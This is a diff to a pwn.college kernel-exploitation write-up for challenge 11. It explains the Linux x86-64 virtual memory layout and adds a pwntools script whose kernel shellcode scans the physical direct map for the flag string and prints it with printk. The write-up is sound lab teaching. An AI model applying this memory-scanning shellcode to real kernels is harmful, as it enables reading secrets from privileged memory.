@@ -739,7 +739,7 @@ One initial idea was to follow the paren'ts `task_struct` in order to find the c
 
 The [following documentation][kernel-scan] and this [link][linternals] greatly describes the kernel virtual memory layout (assumping no KASLR. Otherwise, random sized holes are presented). In particular, we can learn that:
 
-1. `page_offset_base` is a very special region, of size `64 TB`, that **direct-maps between virtual and physical memory**. This means that `PA 0` is mapped to `page_offset_base`, `PA 0x1000` to `page_offset_base + 0x1000`, and so on. Without KASLR, its address is completely deterministic:
+1. `page_offset_base` (macro `__PAGE_OFFSET_BASE`) is a very special region, of size `64 TB`, that **direct-maps between virtual and physical memory**. This means that `PA 0` is mapped to `page_offset_base`, `PA 0x1000` to `page_offset_base + 0x1000`, and so on. Without KASLR, its address is completely deterministic. :
 
 ```bash
 (gdb) p/x page_offset_base 
@@ -748,20 +748,121 @@ $1 = 0xffff888000000000
 0xffff888000000000:     0xf000ff53f000ff53      0xf000ff53f000e2c3
 ```
 
-2. vmalloc/ioremap space, `vmalloc_base`. While `kmalloc` gurantees the allocated pages are both physically and virtually contiguous, `vmalloc` only gurantees virtual contiguous. This means that the mapping to physical memory pages may be completely scattered. Hence, `vmalloc` access is usually slower, as multiple page-translations shall occur - up to `sizeof(alloc) / PG_SIZE`. The advantage of `vmalloc` is whenever extremely large areas are needed (for example, when loading a new kernel module, Similar to `mmap` and dynamic libraries), as `kmalloc` is limited to `~128 KB` allocations. 
+2. vmalloc/ioremap space, `vmalloc_base`, defined by `VMALLOC_START, VMALLOC_END`. Reserved region for non-contiguous physical memory allocations. While `kmalloc` gurantees the allocated pages are both physically and virtually contiguous, `vmalloc` only gurantees virtual contiguous. This means that the mapping to physical memory pages may be completely scattered. Hence, `vmalloc` access is usually slower, as multiple page-translations shall occur - up to `sizeof(alloc) / PG_SIZE`. The advantage of `vmalloc` is whenever extremely large areas are needed (for example, when loading a new kernel module, Similar to `mmap` and dynamic libraries), as `kmalloc` is limited to `~128 KB` allocations. 
 
-3. and virtual memory map (`vmemmap_base`). 
+3. Virtual memory map, `vmemmap_base`, defined by `VMEMMAP_START`. Maps the `vmemmap` - a global array in virtual memory that indexes all pages, currently tracked by the kernel.  
 
-4. kernel text mapping, mapped to physical address 0
+4. kernel text mapping, mapped to physical address 0. Defined by `__START_KERNEL_map`. This means that by reading the `page_offset_base`, the first bytes we see are actually the start of the kernel's text section!
 
+5. module mapping space, defined as: `#define MODULES_VADDR (__START_KERNEL_map + KERNEL_IMAGE_SIZE)`. 
 
-5. module mapping space
+Since the physical memory is contigious, by scanning the special direct-map region, it is guranteed we'd never access an unmapped page. If the child process would die, we would have to make sure our exploit wouldn't consume too much memory. Otherwise, the target flag's physical page would've been swapped out. Moreover, the flag will always be loaded to a constant offset within a page. Hence, we can greatly optimize our scanner such that it would only scan certain offsets within physical pages. But I'd actually prefer making a generic yet slow scanner, instead of a fast and offset-specific scanner. The scanner would simply search for `"pwn.college{"` within all physical memory, and upon finding an adequate candidate, call `printk` on it. 
 
-3. Since the physical memory is contigious, by scanning this special region, it is guranteed we'd never access an unmapped page. If the child process would die, we would have to make sure our exploit wouldn't consume too much memory. Otherwise, the target flag physical page would've been swapped out. Moreover, the flag will always be loaded to a constant offset within a page. Hence, we can greatly optimize our scanner such that it would only scan certain offsets within physical pages. But I'd actually prefer making a generic yet slow scanner, instead of a fast and offset-specific scanner. The scanner would simply search for `"pwn.college{"` within all physical memory, and upon finding an adequate candidate, call `printk` on it. 
+```python
+BINARY = '/challenge/babykernel_level11.0'
+GDB_SCRIPT= '''
+set follow-fork-mode child
+set print elements 0
+handle SIG33 nostop noprint
 
-```c
+c
+'''
 
+context.arch = 'amd64'
+SHELLCODE = '''
+user_shellcode:
+mov rdi, 3
+lea rsi, [rip + kernel_shellcode]
+mov rdx, 0x1000
+mov rax, 1
+syscall
+
+kernel_shellcode:
+push rbx
+push rbp
+mov rbp, rsp
+mov rbx, 0xffff888000000000
+
+read_loop:
+mov cl, byte ptr [rbx]
+cmp cl, 0x70
+jne next
+
+mov cl, byte ptr [rbx + 1]
+cmp cl, 0x77
+jne next
+
+mov cl, byte ptr [rbx + 2]
+cmp cl, 0x6e
+jne next
+
+mov cl, byte ptr [rbx + 3]
+cmp cl, 0x2e
+jne next
+
+mov cl, byte ptr [rbx + 4]
+cmp cl, 0x63
+jne next
+
+mov cl, byte ptr [rbx + 5]
+cmp cl, 0x6f
+jne next
+
+mov cl, byte ptr [rbx + 6]
+cmp cl, 0x6c
+jne next
+
+mov cl, byte ptr [rbx + 7]
+cmp cl, 0x6c
+jne next
+
+mov cl, byte ptr [rbx + 8]
+cmp cl, 0x65
+jne next
+
+mov cl, byte ptr [rbx + 9]
+cmp cl, 0x67
+jne next
+
+mov cl, byte ptr [rbx + 10]
+cmp cl, 0x65
+jne next
+
+mov cl, byte ptr [rbx + 11]
+cmp cl, 0x7b
+jne next
+jmp done
+
+next:
+add rbx, 1
+jmp read_loop
+
+done:
+mov rdi, rbx
+mov rbx, 0xffffffff810b69a9
+call rbx
+
+mov rsp, rbp
+pop rbp
+pop rbx
+ret
+'''
+
+def main():    
+    p = process(BINARY)
+    
+    user_shellcode = asm(SHELLCODE)
+    with open('gdb_input.bin', 'wb') as f:
+        f.write(user_shellcode)
+    
+    p.send(user_shellcode)
+    p.interactive()
 ```
+
+The since we call `printk` within the shellcode, the flag's content may be read via `dmesg`. 
+
+## Challenge 12
+
 
 
 
